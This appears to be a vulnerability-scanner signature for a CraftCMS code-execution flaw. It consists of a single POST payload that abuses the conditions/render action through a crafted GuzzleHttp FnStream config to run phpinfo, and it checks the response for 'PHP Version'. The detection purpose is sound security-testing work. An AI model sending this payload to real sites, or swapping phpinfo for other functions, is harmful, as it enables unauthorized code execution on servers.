{
        'name': 'CraftCMS ConditionsController.php 代码执行漏洞',
        'poc': [{'requests':{
            'method': 'post',
            'payload': '/ConditionsController.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Connection': 'close',
                'Accept-Encoding': 'gzip, deflate'
            },
            'data': r"""action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'PHP Version'
        }}]
    }